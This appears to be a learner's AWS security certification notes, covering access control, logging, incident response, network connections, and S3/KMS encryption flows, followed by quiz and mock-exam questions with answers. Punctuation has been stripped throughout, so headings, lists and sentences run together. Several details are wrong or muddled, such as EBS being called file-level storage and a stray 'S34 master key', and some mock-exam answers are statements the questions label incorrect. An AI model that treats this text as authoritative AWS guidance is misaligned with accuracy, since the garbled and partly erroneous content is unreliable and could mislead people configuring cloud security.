have private internal IP addresses and can only serve requests originating from within VPC   internet facing ELBs have public DNS names and have public and internal IP addresses    Types of ELBsThree different ELBs  u Application Load Balancer  u   supports incoming traffic for web applications running HTTP or HTTPS  allows routing of requests such as to different portsu Network Load Balancer  u   supports millions of incoming requests per second  ideal if low latency and high performance are prioritiesu Classic Load Balancer  u Using a Classic Load Balancer instead of an Application Load Balancer has the following benefits     Support for EC2 Classic    Support for TCP and SSL listeners    Support for sticky sessions using application generated cookiesSecuring APIs  AWS API gateway    Controlling Access to APIsMethods for controlling authentication and authorization      IAM Roles and Policies  using IAM  policies can be associated with user  role  or group to dictate permissions     IAM Tags  can be used in conjunction with IAM policies  used for references pertaining to security controls such as in the following example  a user being able to perform a specific action based on the resource tag      Resource Policies  attached to resources  unlike IAM which is attached to identity   specifies principal that has been granted or denied access to invoke associate API     VPC Endpoint Policies  also a resource based policy  but is a VPC endpoint   VPC endpoints allows access to AWS services using private IP addresses  controls access to private APIs  can be used in conjunction with API Gateway resource policies for additional security     Lambda Authorizers  uses AWS Lambda functions to restrict who can invoke REST API methods  can use bearer based tokens or HTML headers  paths  query string parameters  and stage variables     Amazon Cognito User Pools  APIs can be configured to have  COGNITO USER POOLS  authorizer  to authenticate users via Amazon Cognito user pool API gateway   token is validated before allowing access  Incident Response  AWS Contents  AWS Questions Incident ResponseAWS Cloud Adoption Framework  CAF Addresses four primary control areas 1  Directive Controls   establishes governance  risk  and compliance models2  Preventative Controls   protects workloads and mitigates threats and vulnerabilities3  Detective Controls   provides full visibility and transparency over operation of deployments4  Responsive Controls   drives the remediation of potential deviation from security baselinesThreat Detection and Management    AWS GuardDuty  regional based managed service  powered machine learning  monitors logs and detects unexpected   unusual behaviorAWS Security Hub   brings security statistical data into single place    presented in series of tables and graphs   insights   grouping of findings that meet specific criteria base from specific filters and statements    e g  users with most suspicious activity  S3 buckets with public write or read permissions  EC2 instances with missing security patches  etc Forensics  recommended to have an account with preconfigured settings dedicated to forensics   compromised instances can be moved to forensics account   note that the instance cannot be moved to different AWS account  can also create forensic instance for forensic analysis   could take snapshot of compromised instance   EBS volume and attach it to forensic instanceCommon Infrastructure Security IncidentCommon approach in a breach scenario  blue side1  Capture   obtain metadata from instance2  Protect   prevent EC2 instance from being terminated  enable termination protection 3  Isolate   isolate instance by modifying security group or updated NACL to deny all traffic destined for IP address of instance4  Detach   remove affected instance from any autoscaling groups5  Deregister   remove EC2 instance from any associated ELBs6  Snapshot   take snapshot of EBS volumes for forensics7  Tag   highlight instance that is prepared for forensic investigation  Secure Connections to AWS Environment  AWS Contents  AWS Questions Secure Connections to AWS Environment  can connect securely using either VPN connection or Direct Connect connectionAWS VPNUses two components 1  Virtual Private Gateway  VPN gateway    resides within AWS   consists of two endpoints located in different data centers2  Customer gatewayPasted image 20220215120110 png  consists of two IPsec tunnel    u IPsec Tunnel  u   secure network protocol allowing encrypted communication between two endpoints    implemented at IP layer  uses public network to establish connection    RoutingRoute table exampleDestination Target10 0 0 0 16 Local172 16 0 0 16 pcx 1234abcd172 16 1 0 24 vgw wxyz67891  First route is local route of VPC  found in every route table 2  Second route points to target relating to VPC peering connection3  Third route point to VPN gatewayif packet is meant for destination that is covered by two subnets  it will go to the more specific subnet   e g  if packet is meant for 172 16 1 5  it will go to the third route even though route 1 and route 2 both cover that destination  route propagation can be enabled in VPN gateway to automatically add site to site VPN connections to route tableAWS Direct Connect  like VPN connection  joins your own infrastructure with AWS architecture as if it were a single network  generally provides more consistent and reliable connection  Connection runs across private network via an AWS Direct Connect location   Pasted image 20220216094601 pngThree distinct locations involved to establish link 1  Corporate site where your own private network resides2  AWS Direct Connect location  typically owned by AWS partner 3  AWS VPC within specific AWS regionPrerequisites for configuring and establish connection 1  Your organization works with an AWS Direct Connect partner who is a member of AWS Partner Network  APN 2  Your network has co location connection to AWS Direct Connect location3  Your organization works with an IPS allowing connection to AWS Direct ConnectOnce physical network connection to AWS Direct Connect location established  network must follow this criteria 1  Authentication   router must support Border Gateway Protocol  BGP  and MD52  Network must use single mode fiber3  Manually configured speed and full duplex enabled4  802 1Q VLAN encapsulation support enabledVirtual Interfaces   connection can be partitioned into virtual interfaces    allows access to other AWS services other than what is within your VPC   Securing EC2 Instances   AWS Contents     AWS Questions Securing EC2 Instances     Elastic Compute Cloud  EC2  is the most common of the compute services   can use Amazon Inspector  vulnerability scanner Key Pairs  used to allow connection to instance  uses public key cryptography  2048 bit SSH 2 RSA   public key maintained by EC2 instance  private key is with customer   keys are unrecoverable if lost   public key encrypts creds  private key decryptsMonitoring and Logging    AWS CloudTrail  tracks and records API calls  for every API call the following is tracked    API that was called   service to which API call was made against   timestamp when it was called   source IP address of requesterAWS Config   logs any change to resources   acts as resource inventory   stores and reviews configuration history of resources   integrates with CloudTrail    shows which API call made specific changes   checks compliance rulesAmazon CloudWatch   most common AWS monitoring service   monitors resource performance over time   can be used with unified Cloud Agent to collect logs of applicationsVPC Flow Logs   Virtual Private Cloud  VPC    captures all IP traffic Isolation  security group should be created so that a compromised instance can quickly be changed to this group   the group should not be able to communicate with any other resources   log data should be stored in dedicated S3 bucket  create IAM roles that only allow read only access to resources   prevents accidentally changing data on instanceSystems Manager  SSM   allows to quickly administer and perform operational actions against instances without SSH or RDP    Actions     Automation  automate processes against groups of resources via SSM documents  e g  patching EC2 instances or creating AMI  Amazon Machine Image Run Command   manage fleet of EC2 instances remotely and securely   can perform maintenance and management without logging into instances   uses SSM documents to help perform administrative tasks and configuration changes Distributor   distributes software across instances State Manager   maintains state of EC2 instances   uses of state manager     configuring network settings    bootstrapping instances    ensuring installation of agents are schedually updated    running scripts on instances Patch Manager   automates management of patch updates across EC2 instances   you can create patch groups which associates a number of instances with a group    allows you to associate a group with a single patch baseline    instances not associated with patch group will receive default patch baseline  Auditing and Governance   AWS Contents     AWS Questions Auditing and Governance      AWS Artifact   on demand portal allowing viewing and downloading AWS security and compliance reports and online agreements    these reports are undetaken by external auditors of AWS    agreements for accounts made with AWS Securing with CloudTrail  data  logs  can be encrypted with SSE KMS  SHA 256 used for file validation  when validation is enabled  digest files are created   digest files reference every log file delivered within specific timeframe along with associated hash   digest files are signed using private key of a public private key pair used by CloudTrail for that regionValidating if log was tampered with or moved  aws cloudtrail validate logs   trail arn  trailARN    start time  start timeAWS Config  useful for seeing history of modifications to a resource via looking at the history of configuration itemsComponents of AWS Config   Configuration items  Configuration streams  Configuration history  Configuration snapshots  Configuration recorder  Config rules  Resource relationships  Config roleConfiguration Items  CI    fundamental element of AWS Config   contains point in time snapshot info on configuration data of attributes of an AWS resource such as     current configuration    direct relationships resource has with other resources    metadata    events   CI updated each time change is made on resource  e g  create  update  or delete API call made against resource Components of Configuration Item   Metadata    info and data about config item  Attributes    data of actual resource that CI relates to  Relationship    data related to any connected resource  e g  if CI is related to a subnet  the relationship could contain data related to associated VPC that subnet is part of   Current Configuration     shows same info that would be generated upon performing a  describe  or  list  API callAmazon Macie  managed service backed by machine learning  automatically detects  protects  and classifies data within S3 buckets  classifies data to determine its level of sensitivity  Implementing Logging Mechanisms  AWS Contents  AWS Questions Implementing Logging MechanismsAmazon S3 Logging  most common AWS storage service  logs can be sent to S3 or Amazon CloudWatch LogsTwo types of logging within S3 1  Server access logs2  Object level logsServer Access Logs Log details captured    identity of requester accessing bucket   name of bucket being accessed   timestamp of when action was carried against bucket   action that was done   HTML response status   any error codes  br    source and target buckets must be in same regionObject Level Logging   must be associated with CloudTrail which will record write and read API activityFlow Logs   captures IP traffic across network interfaces   default log file format     bash   version    account id    interface id    srcaddr    dstaddr    srcport    dstport    protocol    packets    bytes    start    end    action    log status 1  version  version of the flow log2  account id  AWS account ID3  interface id  interface ID that log stream data applies to4  srcaddr  IP source address5  dstaddr  IP destination address6  srcport  source port used for traffic7  dstport  destination port for traffic8  protocol  protocol number being used for traffic9  packets  total number of packets sent during capture 10  bytes  total number of bytes sent during capture11  start  timestamp of when capture window started12  end  timestamp of when capture windows finished13  action  whether traffic was accepted or rejected by security groups14  log status  status of logging  which is one of three codes    OK  data is being received   NoData  no traffic to capture during capture window   SkipData  some data within log was captured due to an errorVPC Traffic Mirroring  duplicates network traffic from elastic network interfaces attached to instances   duplicated traffic sent to third party tools and services for analysisCloudTrail  Trails    contain configurable options for what to monitor and track  Events    every API call is stored as an event  Log Files    created every 5 minutes  stored within S3 bucket  CloudWatch Logs    logs can be sent to CloudWatch for analysis and monitoring  API Activity Filters    provide search and filter functionality when looking at API activityUnderstanding CloudTrail Logs  center Example of CloudTrail Log  center json awsRegion    eu west 1 eventID    6ce47c89 5908 452d 87cc a7c251ac4ac0 eventName    PutObject eventSource    s3 amazonaws com eventTime    2019 11 27T23 54 21Z eventType    AwsApiCall eventVersion    1 05 readOnly   false  recipientAccountId    730739171055 requestID    95BAC3B3C83CCC5D requestParameters   bucketName    cloudtrailpackt Host    cloudtrailpackt s3 eu west 1 amazonaws com key    Packt AWSLogs 730739171055 CloudTrail eu west 1 2019 11 27 730739171055 CloudTrail eu west 1 20191127T2321Z oDOj4tmndoN0pCW3 json gz x amz acl    bucket owner full control x amz server side encryption    AES256  sharedEventID    11d4461b 0604 46c4 b4c9 6a23b3e7f57c sourceIPAddress    cloudtrail amazonaws com userAgent    cloudtrail amazonaws com userIdentity   invokedBy    cloudtrail amazonaws com type    AWSServiceshows Cloudtrail made  PutObject  request to Amazon S3 to store its log file  see the  key  parametereventName   name of API called eventSource   AWS service in which API call was made eventTime   time of API call SourceIPAddress   IP that made the API call  if a service did the API call then instead the name of the service would be displayed  userAgent   agent method of request Console amazonaws com   determines that root user made request userIdentity   additional info relating to user agentAmazon Athena   serverless service   analyzes data stored within Amazon S3  such as CloudTrail logs    uses SQL CloudWatch   main AWS monitoring service   collects data and metrics from all supported AWS services    can be implemented in a large scale using AWS Systems Manager  SSM Automation  AWS Contents  AWS Questions AutomationAutomating Security Detection and Remediation    Using CloudWatch Events with AWS Lambda and SNS  can identify event to capture and create an automatic response     AWS Lambda   serverless compute service  automatically provisions compute power  allows running code for applications either on demand or in response to events without needing to provision any compute instances yourself  allows freedom of not having to maintain a compute instance  this is handled by AWSAmazon GuardDuty   can be used for automation detection and remediation    powered by machine learning   can capture events from CloudTrail logs  DNS logs  and VPC flow flogs    events referenced against threat detection feeds  compared against known sources of malicious activity    runs on AWS infrastructure so doesn t affect performance of your infrastructureAWS Security Hub   collects security findings from     AWS IAM    Amazon Macie    Amazon GuardDuty    Amazon Inspector    AWS Firewall Manager   has predefined and managed insights to identify security related weaknesses   Discovering Security Best Practices   AWS Contents     AWS Questions Discovering Security Best Practices      Multi Factor Authentication  MFA     Enable AWS CloudTrail    Remove root account access keysaccount keys enabled access via AWS CLI  SDK  or other development tools    Strong passwords    Principle of Least Privilege  PoLP     Encrypt data    Automate security threat detection and remediation AWS Trusted Advisor    recommends enhancements against number of predefined best practice checks across five areas of your account    1  Cost optimization identifies resources not optimally used   2  Performance looks for resources that could make use of provisioned throughput identifies over utilized resources   3  Security identifies weaknesses    4  Fault Tolerancedetermines whether you have adequate resiliency built into environment   5  Service Limits checks if services have reached 80  of allotted service limitPentesting AWS  can t carry pentest against some services without prior approval from AWS  services you can pentest against    Amazon EC2 instances  NAT gateways  and elastic load balancers   Amazon RDS   Amazon CloudFront   Amazon Aurora   Amazon API Gateways   AWS Lambda and Lambda Edge functions   Amazon Lightsail resources   Amazon Elastic Beanstalk environments  services not to be pentested    DNS zone walking via Amazon Route 53 hosted zones   Denial of Service  DoS   Distributed Denial of Service  DDoS   simulated DoS  simulated DDoS   Port flooding   Protocol flooding   Request flooding  login request flooding and API request flooding   Managing Data Security  AWS Contents  AWS Questions Managing Data SecurityAmazon EBS Encryption  EBS volumes provide block level storage to EC2 instance   gives more flexibility for storage capabilities  default regional encryption setting can be applied to EBS volumes to automatically encrypt new EBS volumes   uses KMS service to encrypt dataAmazon EBS  used for file level storage  support in transit and at rest encryption  uses KMS service to encrypt dataAmazon S3  provides object level storageFive different encryption options for S3 objects 1  Server side encryption with S3 managed keys  SSE S3 2  Server side encryption with KMS managed keys  SSE KMS 3  Server side encryption with customer managed keys  SSE C 4  Client side encryption with KMS managed keys  CSE KMS 5  Client side encryption with customer managed keys  CSE Cserver side encryption  encryption algorithm and process run from server side  i e  in this case it is within Amazon S3   client side encryption  encryption process executed on client side before data sent to S3SSE S3 Encryption    Pasted image 20220225215402 png   1  Client selects object s  to upload to S3 and indicates SSE S3 as encryption algorithm 2  S3 encrypts object with plaintext data key and encrypted object stored in chosen S3 bucket 3  plaintext data key encrypted with S3 master key  and the encrypted key is then stored into S3 and associated with encrypted data object 4  Plaintext data key removed from memory Decryption    Pasted image 20220225215755 png   1  User request encrypted object 2  Encrypted data key of object is decrypted with S34 master key 3  Plaintext data key decrypts encrypted data object 4  S3 returns plaintext data object to clientSSE KMS Encryption   Managing Key Infrastructure SSE KMS Encryption   Decryption   Managing Key Infrastructure SSE KMS Decryption  SSE C Encryption    Pasted image 20220225220028 png  1  Client uploads object to S3 along with plaintext customer provided key across HTTPS   mandatory to use HTTPS2  Object is encrypted with key and a salted HMAC value of customer key is generated for validation upon future access requests  HMAC value and encrypted object stored in S3 with association to each other  Plaintext key removed Decryption    Pasted image 20220225234838 png   1  User requests encrypted object via HTTPS  Customer key sent to S3  2  S3 uses stored HMAC value of key to validate the client sent the correct key  3  Customer key used to decrypt object data  4  Plaintext object sent to client CSE KMS Encryption    Pasted image 20220225235024 png   1  Client uses AWS SDK  Software Development Kit  to request data keys from KMS using specified CMK 2  KMS genrate two data keys using the CMK  plaintext data key and cipher blob of that key 3  KMS sends the keys back to requesting client 4  Client encrypts object data with plaintext version of data key and stores the resulting encrypted object  5  Client uploads encrypted object data and cipher blob version of key to S3   6  Cipher blob key stored as metadata against encrypted object  Decryption    Pasted image 20220225235449 png   1  User requests access to encrypted S3 object  2  Encrypted object sent to client with associated cipher blob key  3  Cipher blob sent back to KMS to generate data key  4  KMS uses original CMK along with cipher blob to generate a plaintext version of data key  5  Plaintext data key sent back to requesting Java client  6  Java client uses plaintext key to decrypt object CSE C Encryption    Pasted image 20220225235650 png   1  Java client create plaintext data key to encrypt object data  2  CMK created by customer encrypts plaintext data key  3  Encrypted data key and encrypted object sent from client to S3 storage  4  S3 associates encrypted data key with encrypted object and stores both in S3  Decryption    Pasted image 20220225235831 png   1  Uses requests access to encrypted object  2  S3 sends requested object data with associated encrypted data key  3  Customer CMK used with encrypted data key to generate plaintext version of data key  4  Encrypted object decrypted using plaintext data key Amazon RDS  database service  encryption at rest uses AES 256  can only encrypt RDS database during its creation  SSL TLS used for in transit encryptionAmazon DynamoDB  fully managed key value and document NoSQL database  at rest server side encryption enabled by default   this setting cannot be disabledThree options to encrypt data with 1  DEFAULT  key owned by Amazon DynamoDB2  KMS   Customer managed CMK3  KMS   AWS managed CMKencryption in transit uses HTTPS  Managing Key Infrastructure  AWS Contents  AWS Questions Managing Key InfrastructureAWS Key Management Service  KMS   managed service  allows you to create  store  rotate  and delete encryption keys  unlike SSL  KMS not designed for encryption in transit  supports symmetric and asymmetric CMKsCustomer Master Keys  CMK    building block of KMS   contains material used for encrypting and decrypting dataThree different types of CMKs 1  AWS owned   rotation period varied from service to service   managed and created by AWS   e g  Amazon S3 encryption using S3 master key  SSE S3    can t view keys2  AWS managed   can t control rotation frequency   can view keys being used and track their usage and key policies3  Customer managed   full control of keysData Encryption Keys  DEKs    created by CMKs   unlike CMKs  doesn t reside within KMS service   used outside of KMS to encrypt data   when DEK is generated  the associated CMK will create two DEKs  1  Plaintext Key  2  Identical  Encrypted  Key    u Envelope Encryption  u   using one key to encrypt another keyAmazon S3 server side encryption and decryption with KMS managed keys  SSE KMS     SSE KMS Encryption   Pasted image 20220224222854 png1  SSE KMS encryption mechanism chosen by client and either AWS managed or customer managed CMK is selected2  S3 tells KMS to generate DEKs 3  Plaintext data key and identical  encrypted  data key generated4  These data keys are sent to S35  S3 encrypts object data with plaintext version of data key  Encrypted data is then stored with encrypted version of key  Plaintext data key is destroyed SSE KMS Decryption    Pasted image 20220224223534 png   1  Request received by S3 to access encrypted object  2  S3 sends encrypted data key associated with object to KMS 3  KMS uses original CMK to decrypt the data key to generate a plaintext version of that key 4  KMS sends plaintext data key to S3 5  Encrypted object decrypted with that key 6  Plaintext object sent back to clientKey Material  u Key Material  u   Data used to encrypt and decrypt data   stored within CMK   CMK key material can be used to encrypt data key and decrypt it  see   Managing Key Infrastructure SSE KMS Decryption SSE KMS Decryption      key material for AWS managed CMKs gets automatically created   customer managed CMKs give option of adding key material or not    can even import your own key material known as Bring Your Own Key  BYOK     BYOK doesn t support automatic key rotationKey Policies   cannot control access to CMKs without key policies   access to CMK can be configured via   1  Key Policies  All access governed by key policy  2  Key Policies and IAM  Access governed by key policy and IAM identity based policiesallows access via groups and other IAM features  3  Key Policies and Grants  Access governed by key policy with ability to delete access to other for using the CMKcheck page 508 512  great explanationAWS CloudHSM  fully managed service used for data encryption  can integrate with KMS in the form of using CloudHSM as a custom key store   allows storage of CMKs outside of KMS and into CloudHSM cluster  HSM stands for Hardware Security Module   generates keys and stores them   can use different encryption algorithms for both symmetric keys and asymmetric keys   manages symmetric and asymmetric keys   signs and verifies signatures   can use hash function to compute hash based message authentication codes  HMACsCloud HSM Users User types of CloudHSM 1  Precrypto Office 2  Crypto Office 3  Crypto User 4  Appliance UserOperations   PRECO   CO   CU  AUObtain basic cluster information  number of HSMs in cluster  IP address  serial number  etc     No   Yes   Yes   YesZeroize HSMs  delete keys  certificates  and data  on the HSM    No   Yes   Yes   YesChange own password   Yes   Yes   Yes   YesChange any user s password   No   Yes   No   NoAdd and remove users   No   Yes   No   NoGet synchronization status   No   Yes   Yes   YesKey management operations   No   No   Yes   NoEncrypt  decrypt  sign  verify  generate  and digest HMACs   No   No   Yes   No     Precrypto Office  PRECO   automatically created upon creating first HSM within cluster  PRECO user has default creds  when first connecting to the HSM  you are prompted to change password of PRECO user   this turns the PRECO user into a Crypto Office  CO  user Crypto Office  CO    greater permissions than PRECOPermissions   create  delete and change passwords of users  delete keys  certificates  and data on HSM  obtain HSM metadata Crypto User  CU  Permissions    perform encryption and decryption   create  delete  wrap  unwrap  and mofity attributes of key   signs and verifies   generate digests and HMACs Appliance User  AU    exists on all HSMs   clones and synchronizes actions of HSMs   has same permissions as CO but cannot change passwords or add remove userAWS Secrets Manager  managed service  secrets retrieved by calling Secrets Manager API u Secrets  u   Anything that is confidential  e g  passwords  API keys  etc  removes need for hardcoding credentials in code  automatically rotates secretsAWS Questions  AWS Contents  AWS Cloud Security   Specialist Misc MiscAWS Questions Section 2 Security Responsibility Access Management Section 2  Security Responsibility and Access Management  AWS Questions Section 3 Security   A Layered Approach   Section 3  Security   A Layered Approach  AWS Questions Section 4 Monitoring Logging and Auditing Section 4  Monitoring  Logging  and Auditing  AWS Questions Section 5 Best Practices and Automation   Section 5  Best Practices and Automation  AWS Questions Section 6 Encryption and Data Security Section 6  Encryption and Data Security   Section 2  Security Responsibility   Access Management  Access Management    Access Policies   Access Policies1  Which format are AWS policies written in    ad notecollapse   JSON2  What type of policy are Amazon S3 bucket policies    ad notecollapse   Resource based3  What parameter is needed within a resource based policy to identify who or what the policy should be associated with    ad notecollapse   Principal4  After configuring cross account access  from which account do you assume the cross account role from   the trusted account or the trusting account    ad notecollapse   Trusted account5  True or false  the Access Advisor tab allows you to determine when identities accessed different services    ad notecollapse   TrueFederated and Mobile Access   Federated and Mobile Access    1  True or false  Federated access within AWS allows access to your AWS resources without needing to create any permissions     ad note collapse    False  2  Which AWS service uses federation to manage access to web and mobile applications with ease    ad notecollapse   Amazon Cognito3  What are the two common types of federated access with AWS    ad notecollapse   SAML Federation and Social Federation4  What is IdP short for in relation to federated access    ad notecollapse   Identity provider5  True or false  Identity pools actually provide you with the ability to assign permissions to users to access AWS resources used within a mobile app by using temporary credentials    ad notecollapse   TrueShared Responsibility Model   Shared Responsibility Model   1  Which shared responsibility model offers the most customization and  control for the customer     ad note collapse    Infrastructure model  2  Which shared responsibility model offers the least customization and  control for the customer    ad notecollapse   Abstract3  In which model would you expect to find the EC2 service    ad notecollapse   Infrastructure4  Which model focuses on services that essentially reside on top of infrastructure services  such as Amazon EMR and Amazon RDS    ad notecollapse   Container5  True or false  the customer s responsibility is defined as security in the  cloud    ad notecollapse   TrueSection 3  Security   A Layered Approach    Securing EC2 Instances  Securing EC2 Instances1  True or False  AWS Systems Manager is a fully managed service that allows you to help secure your instances and the applications that run on top of them by performing vulnerability assessments via an agent    ad notecollapse   False2  True or False  Amazon Inspector requires an agent to be installed to remotely run assessments    ad notecollapse   False    Used to be true   It now uses SSM to remove the need for installing an agent3  Is the public key of an EC2 instance key pair held by AWS or you as the customer    ad notecollapse   AWS4  Which service is used to track and record API calls made within your AWS account    ad notecollapse   AWS CloudTrail5  Which service allows you to easily and quickly administer and perform operational actions against your instances  both Windows and Linux based  at scale for both on premise resources and within AWS without having to SSH or RDP into those instances    ad notecollapse   Systems Manager  SSMConfiguring Infrastructure Security   Configuring Infrastructure Security   1  What does VPC stand for     ad note collapse    Virtual Private Cloud  2   Which VPC component provides a connection between your VPC and the outside world    ad notecollapse   Internet Gateway  IGW3  Which VPC component allows instances in a private subnet to initiate a connection to the internet  for example  for essential operating system updates  but prevents any inbound access to the private subnet being initiated from the internet    ad notecollapse   NAT Gateway4  True or false  Security groups provide a virtual firewall level of protection at the instance level    ad notecollapse   True5  True or false  Using the default NACL of your VPC provides enhanced security protection blocking all network traffic  both inbound and outbound    ad notecollapse   FalseImplementing Application Security   Implementing Application Security   1  True or false  The main function of the AWS WAF service is to provide protection for your web applications from malicious attacks from a wide variety of attack patterns     ad note collapse    True  2  Which service allows you to manage WAF rules across a multi account environment when using AWS Organizations    ad notecollapse   AWS Firewall Manager3  Which AWS service must you enable as a prerequisite to use AWS Firewall Manager    ad notecollapse   AWS Config4  Which type of load balancer would you use if low latency and high performance are key to your application architectures    ad notecollapse   Network Load BalancerDDoS Protection   DDoS Protection   1  Which type of DDoS attack takes advantage of the three way handshake that is used to establish a connection between two hosts     ad note collapse    SYN Flood  2  How many tiers are there to choose from when working with AWSShield    ad notecollapse   23  True or false  AWS Shield Advanced is a premium tier that comes with a range of additional features and protection    ad notecollapse   True4  True or false  The DDoS Response Team  DRT  is a specialized team at AWS who can help you to review  analyze  and monitor suspected malicious activity within your account and offer help and solutions on how to resolve a potential attack    ad notecollapse   True5  True or false  By selecting a rate based rule  you can define the maximum number of requests from a single IP within a 30 minute time frame    ad notecollapse   FalseIncident Response   Incident Response   1  Which framework has been designed by AWS to help you transition and migrate solutions into AWS Cloud that s based on best practices and recommendations     ad note collapse    Cloud Adoption Framework  CAF   2  Which AWS service is a regional based managed service that s powered by machine learning  specifically designed to be an intelligent threat detection service    ad notecollapse   Amazon GuardDuty3  Which AWS service acts as a single pane of glass view across your infrastructure  thus bringing all of your security statistical data into a single place and presented in a series of tables and graphs    ad notecollapse   AWS Security Hub4  True or False  Having a separate AWS account to be used for forensic investigations is essential to helping you diagnose and isolate any affected resource    ad notecollapse   TrueSecure Connections to AWS Environment   Secure Connections to AWS Environment   1  When configuring a VPN connection  a VPN gateway is configured as well as what other type of gateway     ad note collapse    Customer Gateway  2  True or false  when an end to end connection is established between two gateways using a VPN connection with IPsec  the connection is referred to as a tube    ad notecollapse   False3  Does Direct Connect use a public or private network to establish a connection with AWS    ad notecollapse   Private4  True or false  by enabling route propagation  all other routes to networks represented across your site to site VPN connection will be automatically added to your route table  preventing you from having to manually add them    ad notecollapse   TrueSection 4  Monitoring  Logging  and Auditing    Implementing Logging Mechanisms  Implementing Logging Mechanisms1  True or false  Amazon S3 server access logging is enabled by default    ad notecollapse   False2  Amazon S3 object level logging closely integrates with which other AWS service    ad notecollapse   AWS CloudTrail3  Which logging feature allows you the ability to capture IP traffic across the network interfaces attached to your resources    ad notecollapse   VPC Flow Logs4  True or false  A VPC Flow Log can be configured for a subnet with a VPC    ad notecollapse   True5  Which AWS service can be used to easily query AWS CloudTrail logs  enabling you to search for specific data    ad notecollapse   Amazon AthenaAuditing and Governance   Auditing and Governance   1  Which AWS service is an on demand portal to allow you to view and download AWS security and compliance reports  in addition to any online agreements     ad note collapse    AWS Artifact  2  Which security feature of AWS CloudTrail ensures that your log files have not been tampered with or modified after they have been written to your bucket in Amazon S3    ad notecollapse   Logfile Validation3  Which feature in AWS Config automatically monitors your resources to ensure they are meeting specific compliance controls    ad notecollapse   AWS Managed Rules4  Which service is backed by machine learning and provides an automatic way of detecting  protecting  and classifying data within your S3 buckets    ad notecollapse   Amazon Macie5  True or false  Amazon Macie classifies data through a series of automatic content classification mechanisms  It performs its classification using the object level API data events collated from CloudTrail logs    ad notecollapse   TrueSection 5  Best Practices and Automation    Automation  Automation1  True or false  CloudWatch events can be used to search for specific events within your infrastructure  which can trigger an automated response    ad notecollapse   True2  Amazon GuardDuty is able to process and analyze millions of events that are captured through your AWS CloudTrail logs  DNS logs  and which other logging mechanism    ad notecollapse   VPC Flow Logs3  Which AWS service acts as a single pane of glass approach to your security notifications across your accounts    ad notecollapse   AWS Security Hub4  True or false  AWS Security Hub integrates with AWS Trusted Advisor to help you automate the remediation process of any findings found    ad notecollapse   FalseDiscovering Security Best Practices   Discovering Security Best Practices   1  True or false  You should enable access keys for your root account that would enable programmatic access to your AWS account     ad note collapse    False  2  Which AWS service highlights and recommends enhancements against a number of predefined best practice checks across five different areas of your account    ad notecollapse   AWS Trusted Advisor3  Which check within AWS Trusted Advisor is used to determine whether you have adequate resiliency built into your environment  for example  through making use of multi Availability Zone features and auto scaling    ad notecollapse   Fault Tolerance4  Which support plans only give access to seven core Trusted Advisor checks    ad notecollapse   Basic and Developer5  True or false  A penetration test  or pentest  is essentially an authorized cyber attack on your own environment and infrastructure in an effort to determine its weak points and vulnerabilities  in addition to its strengths  against defined security standards    ad notecollapse   TrueSection 6  Encryption and Data Security    Managing Key Infrastructure  Managing Key Infrastructure1  True or False  Asymmetric encryption uses a single key to encrypt and decrypt data    ad notecollapse   False2  Which component is the main building block of the KMS service as it contains the key material used for both encrypting and decrypting data    ad notecollapse   Customer Master Key  CMK3  There are three different types of CMKs used by KMS that you need to be familiar with  AWS owned  customer managed  and which other    ad notecollapse   AWS managed4  Which component of KMS is used to determine who can use the key to perform cryptographic operations  such as encrypt  decrypt  and GenerateDataKey  in addition to who can administer the CMK    ad notecollapse   Key policy5  Which AWS service offers the ability to maintain a level of security protection for any API keys  in addition to other secrets    ad notecollapse   AWS Secrets ManagerManaging  Data Security   Managing Data Security   1  What does IOPS stand for     ad note collapse    Input Output Operations Per Second  2  Which AWS service provides persistent block level storage to your EC2 instance  providing more flexibility to your instance storage capabilities    ad notecollapse   Amazon  Elastic Block Store  EBS3  Which AWS service is used for file level storage and has the capacity to support access to thousands of instances at once    ad notecollapse   Amazon Elastic File Service  EFS4  True or false  you can enable encryption at rest using the AWS CLI  an SDK  the AWS EFS API  or the AWS Management Console    ad notecollapse   True5   By default  at rest encryption using server side encryption is enabled on all DynamoDB tables  Which AWS service is integrated to perform this encryption    ad notecollapse   AWS Key Management Service  KMSMisc   AWS Contents  AWS Questions   Notes  AWS Artifact is a resource about compliance related stuff  AWS Config is a service that enables you to assess  audit  and evaluate the configurations of your AWS resources  Amazon CloudFront is a web service that is used for distributing content    delivers web content through network via edge locations  locations that are closest to the client requesting website   therefore gives client lowest latency  CloudTrail logs can provide detailed API tracking for Amazon S3 bucket level and object level operations  VPC Flow logging logs IP data going to and from designated network interfaces and stores this data in Amazon CloudWatch  Amazon Athena is a serverless  interactive query service to query data and analyze big data in Amazon S3  VPC peering   networking connection between two VPCs that enables traffic to be routed between them    allows instances within those VPCs to communicate with each other as if they were in the same network  Amazon S3 Glacier is a secure  durable  and extremely low cost Amazon S3 storage class for data archiving and long term backup  AWS Control Tower enforces and manages governance rules for security  operations  and compliance at scale  ACLs were the first authorization mechanism in S3  Bucket policies are the newer method  and the method used for almost all AWS services  Policies can implement very complex rules and permissions  ACLs are simplistic  they have ALLOW but no DENY   A majority of modern use cases in Amazon S3 no longer require the use of ACLs  and we recommend that you disable ACLs except in unusual circumstances where you need to control access for each object individuallyQuestionsWhat is the difference between Internet Gateway  IGW  and NAT Gateway  NGWinternet gateway allows instances with public IP to access internet  NAT gateway allows instances with no public IP to access internetWhat is the difference between AWS CloudWatch and Amazon CloudTrailAWS CloudWatch monitors AWS resources and applications while CloudTrail monitors activity within AWS environment  Mock Exam QuestionsMock Exam 1  questions I got wrong or was unsure about1  When IAM policies are being evaluated for their logic of access  which two of the following statements are incorrectexplicit denies are always overruled by an explicit allow   access to all resources is allowed by default until access is denied2  Your security team has been tasked with implementing a solution to monitor your EC2 fleet of instances  Upon review  you decide to implement Amazon Inspector  What are the three prerequisites that you would need to implement before using Amazon Inspector   Choose three answersdeploy Amazon Inspector agents to your EC2 fleet   create an IAM service linked role that allows Amazon Inspector to access your EC2 feet4  When using AWS Shield  which type of rule counts the number of requests received from a particular IP address over a time period of 5 minutesrate based5  Following a breach on your network  an instance was compromised and you need to perform a forensic investigation of the affected instance  You decide to move the EC2 instance to your forensic account  Which steps would you take to carry out this processCreate an AMI from the affected EC2 instance and then share that AMI image with your forensic account  From within your forensic account  locate the AMI and create a new instance from the shared AMI6  What is the Log Delivery Group account used for within Amazon S3This is a predefined group by AWS that s used to deliver S3 server access logs to a bucket10  You are using the KMS service called encrypt me to perform encryption within Amazon S3 using a customer created CMK in eu west 1  A colleague explains that they are unable to see the CMK when they try to use it to encrypt data in a bucket named encrypt me too in us east 1  What is the most likely cause of thisCMKs are regional  so it will not appear in us east 111  A developer in your organization requires access to perform cryptographic functions using a customer managed CMK  What do you need to update so that you can add permissions for the developer to allow 